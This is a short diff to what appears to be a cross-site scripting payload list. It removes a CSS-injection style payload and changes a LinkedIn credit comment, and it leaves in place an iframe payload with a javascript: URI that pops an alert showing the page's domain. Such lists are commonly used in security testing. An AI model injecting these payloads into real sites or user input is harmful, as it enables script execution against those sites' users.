@@ -3,14 +3,9 @@ xss
 
 
 
-<div style="font-family:'foo&#10;;color:red;';">XXX
-
-HOLA
-
-
 ```
   
-<!--      Linkedin : https://www.linkedin.com/in/ismailtasdelen/ -->
+<!--      TEST : https://www.linkedin.com/in/sagaryadav8742/ -->
 
 <IFRAME SRC="javascript:javascript:alert(document.domain);"></IFRAME>
 
